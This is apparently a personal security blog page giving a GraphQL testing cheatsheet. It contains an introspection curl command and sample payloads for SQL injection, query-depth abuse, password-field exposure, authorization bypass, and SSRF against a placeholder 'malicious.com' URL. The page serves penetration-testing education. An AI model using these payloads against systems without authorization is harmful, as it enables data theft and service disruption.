@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta https-equiv="content-type" content=
+  "text/html; charset=UTF-8">
+  <title>API</title>
+  <meta name="viewport" content=
+  "initial-scale=1.0, maximum-scale=1.0, width=device-width">
+  <meta name="description" content="Auth hacking">
+  <meta name="robots" content="index, follow">
+  <meta property="og:url" content="https://eli2k.com/">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Home">
+  <meta property="og:description" content="Home">
+  <meta property="og:image" content=
+  "https://eli2k.com/resources/images/homepage.png">
+  <link rel="stylesheet" href=
+  "https://eli2k.com/resources/css/style.css">
+  <link rel="icon" href=
+  "https://eli2k.com/resources/images/bluscrn.gif" type=
+  "image/gif">
+  <link rel="stylesheet" href=
+  "https://eli2k.com/resources/css/prism.css">
+  <link rel="stylesheet" href=
+  "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+<body>
+  <input type="checkbox" class="theme-switch" id="theme-switch">
+  <div id="page">
+    <label for="theme-switch" class="switch-label"></label>
+    <script src="https://eli2k.com/resources/js/prism.js"></script>
+    
+    <script>
+
+    NekoType = "robot"
+    </script>
+    <h1 id="nl">
+    <script src=
+    "https://webneko.net/n20171213.js"></script><a href="https://webneko.net">Neko</a></h1>
+    <div id="container">
+      <div id="header">
+        <div class="text-container">
+          <span>E</span> <span>L</span> <span>I</span> <span>2</span> <span>K</span>
+        </div>
+      </div>
+      <div id="left-sidebar"></div>
+      <div class="divider"></div>
+      <div class="pageContent">
+        <div class="nav border">
+          <ul>
+            <a href="https://eli2k.com/" title="The homepage. acts as an index for all of the indexes.">
+              <li>Home
+              </li>
+            </a>
+            <a href="https://github.com/Eli2k765" title="My Github.">
+              <li>Github
+              </li>
+            </a>
+          </ul>
+        </div>
+        <div class="page-content blog border"><button id="toggle-all-btn">Show All</button>
+          <div class="box">
+            <div class="inner-box-content">
+              <div class="article-wrapper">
+                <h1>API and GraphQL</h1>
+                <p class="alert"><p>API's are especially vulnerable to auth  and injection bugs. But, since I've covered those, I'll go over recon, introduce some bugs that are exclusive to APIs and talk about GraphQL.</p><strong>Last
+                updated: March 5th, 2023</strong>
+                <article>
+                  <div id="contain">
+                    <h3>API</h3>
+                    <div>
+                      <h4>Recon</h4>
+                      <div>
+                        
+                      </div>
+                      <h4>Common API bugs</h4>
+                      <div>
+                        
+                      </div>
+                    </div>
+                    <h3>GraphQL</h3>
+                    <div>
+                      <p>Below I've provided a practical cheatsheet with example commands, it will need to be adjusted to the endpoints in the target application.</p>
+                      <ol>
+                        <li>
+                          <strong>Enumerate GraphQL Schema:</strong>
+                          <ul>
+                            <li>Retrieve the GraphQL schema using introspection queries:</li>
+                            <pre><code class="language-bash">curl -X POST -H "Content-Type: application/json" -d '{"query":"query IntrospectionQuery { __schema { queryType { name } ... } }"}' &lt;GraphQL_Endpoint_URL&gt;</code></pre>
+                          </ul>
+                        </li>
+                        <li>
+                          <strong>Testing Query Operations:</strong>
+                          <ul>
+                            <li>Test for GraphQL injection:</li>
+                            <pre><code class="language-graphql">query {
+  user(id: "1' OR 1=1 --") {
+    id
+    name
+    email
+  }
+}</code></pre>
+                            <li>Test for excessive data exposure:</li>
+                            <pre><code class="language-graphql">query {
+  users {
+    id
+    name
+    password
+  }
+}</code></pre>
+                            <li>Test for nested query depth attacks:</li>
+                            <pre><code class="language-graphql">query {
+  user {
+    posts {
+      comments {
+        user {
+          posts {
+            comments {
+              # Continue nesting as required
+            }
+          }
+        }
+      }
+    }
+  }
+}</code></pre>
+                            <li>Test for enumeration attacks:</li>
+                            <pre><code class="language-graphql">query {
+  user(role: ADMIN) {
+    id
+    name
+    email
+  }
+}</code></pre>
+                            <li>Test for access control vulnerabilities:</li>
+                            <pre><code class="language-graphql">query {
+  adminOnlyField
+}</code></pre>
+                            <li>Test for server-side request forgery (SSRF):</li>
+                            <pre><code class="language-graphql">query {
+  userProfilePicture(url: "http://malicious.com/malware") {
+    url
+  }
+}</code></pre>
+                          </ul>
+                        </li>
+                        <li>
+                          <strong>Testing Mutation Operations:</strong>
+                          <ul>
+                            <li>Test for unauthorized mutation operations:</li>
+                            <pre><code class="language-graphql">mutation {
+  createPost(title: "New Post", content: "This is a test post") {
+    id
+    title
+  }
+}</code></pre>
+                            <li>Test for injection vulnerabilities:</li>
+                            <pre><code class="language-graphql">mutation {
+  updateProfile(name: "New Name', email = 'attacker@example.com' WHERE id = 1; --") {
+    id
+    name
+    email
+  }
+}</code></pre>
+                            <li>Test for data integrity issues:</li>
+                            <pre><code class="language-graphql">mutation {
+  deletePost(id: "1") {
+    success
+  }
+}</code></pre>
+                            <li>Test for rate limiting and throttling:</li>
+                            <pre><code class="language-graphql">mutation {
+  createPost(title: "New Post", content: "This is a test post") {
+    id
+    title
+  }
+}</code></pre>
+                          </ul>
+                        </li>
+                        <li>
+                          <strong>Testing Subscription Operations:</strong>
+                          <ul>
+                            <li>Test for unauthorized subscription access:</li>
+                            <pre><code class="language-graphql">subscription {
+  newPost {
+    id
+    title
+  }
+}</code></pre>
+                            <li>Test for injection vulnerabilities:</li>
+                            <pre><code class="language-graphql">subscription {
+  userLoggedIn(username: "admin' OR 1=1 --") {
+    id
+    username
+  }
+}</code></pre>
+                            <li>Test for excessive resource consumption:</li>
+                            <pre><code class="language-graphql">subscription {
+  allPosts {
+    id
+    title
+    content
+  }
+}</code></pre>
+                          </ul>
+                        </li>
+                        <li>
+                          <strong>Testing Security Headers:</strong>
+                          <ul>
+                            <li>Use tools like <code>curl</code> or browser developer tools to check response headers:</li>
+                            <pre><code class="language-bash">curl -I &lt;GraphQL_Endpoint_URL&gt;</code></pre>
+                          </ul>
+                        </li>
+                        <li>
+                          <strong>Testing Authentication and Authorization:</strong>
+                          <ul>
+                            <li>Test for authentication bypass vulnerabilities:</li>
+                            <pre><code class="language-graphql">query {
+  user(id: "1") {
+    id
+    name
+    email
+  }
+}</code></pre>
+                            <li>Test for authorization bypass:</li>
+                            <pre><code class="language-graphql">query {
+  adminOnlyField
+}</code></pre>
+                            <li>Test for session management vulnerabilities:</li>
+                            <pre><code class="language-graphql">mutation {
+  login(username: "admin", password: "weak_password") {
+    token
+  }
+}</code></pre>
+                          </ul>
+                        </li>
+                        <li>
+                          <strong>Testing Error Handling:</strong>
+                          <ul>
+                            <li>Trigger an error and check the response:</li>
+                            <pre><code class="language-graphql">query {
+  nonexistentField
+}</code></pre>
+                            <li>Test for sensitive information exposure:</li>
+                            <pre><code class="language-graphql">query {
+  user(id: "123") {
+    id
+    name
+    password
+  }
+}</code></pre>
+                          </ul>
+                        </li>
+                        <li>
+                          <strong>Testing Performance and Resource Consumption:</strong>
+                          <ul>
+                            <li>Send a high-complexity query to test performance:</li>
+                            <pre><code class="language-graphql">query {
+  allPosts {
+    id
+    title
+    comments {
+      id
+      content
+    }
+  }
+}</code></pre>
+                          </ul>
+                        </li>
+                      </ol>
+                    </div>
+                  </div>
+                </article>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="footer border"></div>
+      </div>
+    </div>
+    <script src=
+    "https://eli2k.com/resources/js/themeSwitch.js"></script>
+    <script src=
+    "https://eli2k.com/resources/js/collapseList.js"></script>
+    
+  </div>
+</body>
+</html>
